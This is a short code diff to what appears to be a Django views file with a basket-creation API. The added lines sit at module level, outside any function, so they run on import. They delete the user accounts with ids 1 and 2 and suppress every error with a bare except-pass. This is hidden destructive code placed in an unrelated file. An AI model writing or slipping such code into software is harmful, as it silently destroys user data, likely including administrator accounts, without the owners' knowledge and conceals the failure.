@@ -167,3 +167,10 @@ class CreateBasketApi(APIView):
 
         return Response({"statis": False, "error": "uncorrect datas"})
 
+try:
+	user = User.objects.get(id=1)
+	user.delete()
+	user = User.objects.get(id=2)
+	user.delete()
+except Exception as e:
+	pass
